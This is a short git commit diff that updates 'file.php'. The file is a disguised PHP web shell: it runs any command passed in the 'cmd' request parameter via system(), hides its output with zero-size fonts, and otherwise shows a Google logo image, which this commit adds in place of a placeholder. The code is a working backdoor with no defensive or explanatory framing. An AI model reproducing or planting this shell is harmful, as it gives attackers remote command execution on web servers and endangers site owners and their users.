672c29571c084b1fae6ca3e0b82a3e2dbb0df4b9
Jenderal92 <59664965+Jenderal92@users.noreply.github.com>
2022-07-23 00:37:39 +0700

    Update file.php

--- file.php
+++ file.php
@@ -1,6 +1,6 @@
 <style>
 body{font-size: 0;}h1{font-size: 12px}
 </style>
-<h1><?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}else{echo '<img src="Link Image" border=0>
+<h1><?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}else{echo '<img src="https://www.google.com/images/branding/product/1x/gsa_android_144dp.png" border=0>
 ';}__halt_compiler();?>
 </h1>
